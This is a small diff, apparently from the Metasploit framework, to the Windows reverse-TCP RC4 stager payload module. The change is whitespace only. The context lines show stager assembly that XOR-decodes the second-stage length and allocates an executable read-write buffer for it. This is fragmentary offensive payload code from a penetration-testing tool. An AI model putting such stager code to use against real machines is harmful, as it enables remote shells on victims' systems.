@@ -92,7 +92,7 @@ module Payload::Windows::ReverseTcpRc4
       ; Alloc a RWX buffer for the second stage
         mov esi, [esi]         ; dereference the pointer to the second stage length
           xor esi, #{xorkey}   ; XOR the stage length
-          lea ecx, [esi+0x100]  ; ECX = stage length + S-box length (alloc length)
+          lea ecx, [esi+0x100] ; ECX = stage length + S-box length (alloc length)
         push  0x40         ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
       ; push esi               ; push the newly recieved second stage length.
@@ -177,4 +177,3 @@ module Payload::Windows::ReverseTcpRc4
 end
 
 end
-
